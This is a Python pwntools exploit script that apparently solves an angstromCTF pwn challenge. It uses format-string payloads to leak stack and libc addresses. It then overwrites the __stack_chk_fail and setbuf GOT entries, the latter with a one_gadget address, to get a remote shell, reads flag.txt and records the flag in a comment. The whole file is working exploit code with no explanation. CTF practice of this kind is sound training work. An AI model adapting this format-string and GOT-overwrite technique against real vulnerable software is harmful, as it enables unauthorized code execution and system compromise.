#!/usr/bin/env python3
from pwn import *

elf = ELF('./og_patched')
libc = ELF('./libc.so.6')
# p = process(elf.path)
p = remote('challs.actf.co', 31312)

context.binary = elf 
context.log_level = 'debug'

def GDB(): 
    gdb.attach(p, gdbscript='''
        b*go+126
        b*go+163
        c
    ''')
    pause()
# GDB()

pay = b'%12$p|%15$p||'
pay += f'%{0x1259 - 48 + 17}c%10$hn'.encode()
pay = pay.ljust(32, b'\x00')
pay += p64(elf.got['__stack_chk_fail']) 
p.sendlineafter(b'name: ', pay) 

p.recvuntil(b'Gotta go. See you around, ')

leak = p.recvuntil(b'||').split(b'|')
print(leak)

stack_leak = int(leak[0], 16) 
print('stack: ' + hex(stack_leak))
libc_leak = int(leak[1], 16) 
print('libc: ' + hex(libc_leak))

libc.address = libc_leak - libc.symbols['__libc_start_call_main'] - 128 

one_gadgets = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43] 
one_gadget = libc.address + one_gadgets[1]

print('one_gadget: ' + hex(one_gadget))

setbuf = elf.got['setbuf']

package = {
    one_gadget & 0xffff: setbuf,
    one_gadget >> 16 & 0xffff: setbuf + 2
}
print(package)
order = sorted(package)
print(order)

pay = f'%{order[0]}c%11$hn'.encode()
pay += f'%{order[1] - order[0]}c%12$hn'.encode()
pay = pay.ljust(40, b'x')
pay += p64(package[order[0]])
pay += p64(package[order[1]])

p.sendlineafter(b'name: ', pay) 

p.sendline(b'cat flag.txt')

p.interactive()
# actf{you_really_thought_you_could_overwrite_printf_with_system_huh}